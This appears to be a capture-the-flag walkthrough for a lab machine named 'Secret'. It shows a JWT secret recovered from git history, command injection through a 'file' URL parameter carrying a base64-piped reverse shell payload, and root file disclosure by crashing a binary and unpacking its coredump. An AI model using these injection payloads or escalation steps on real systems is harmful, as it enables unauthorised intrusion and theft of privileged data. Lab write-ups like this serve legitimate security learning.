# Secret

Difficulty: 4
Key takeway: check git logs, req.query.file â†’ ?file=...... in URL, try to crash a binary program and examine the coredump
Tags: .git, C, CoreDump, JWT, apport-unpack, auth-token, binary, crash-log, req.query.file
Type: Linux

# Enumeration

portscan 

```bash
22 -> ssh 
80 -> nginx
3000 -> nodejs 
```

- found the TOKEN_SECRET by reverting back to previous git commits
- used /api/user/register and /api/user/login from secret.htb:3000 to obtain an auth token
- used the auth token to get a reverse shell

```python
# inside the routes/private.js file 
# /logs was accepting a "file" parameter 
file = req.query.file; 
.
.
.
git log --oneline ${file} 
```

# Initial Access

- added a reverse shell script in base64 format to get a reverse shell

```python
http://secret.htb:3000/api/logs?file=index.js;echo ....|base64 -d|bash

# remember to url encode it
# make sure you have the right token
# remember to add auth-token: <token> to the headers
```

# Privilege Escalation

- /opt/count can be crashed by sending SIGABRT and the crash logs can be found in /var/crash
- It can be confirmed by looking at the code.c file, in the main function it's including CoreDump in its crash logs

```python
./count 
Directory or File: /root/root.txt 

# in another terminal 
kill -6 <pid of ./count> 
```

- unpack the crash logs using `apport-unpack`
- the contents of the /root/root.txt file are inside the `CoreDump` file

## Notes

-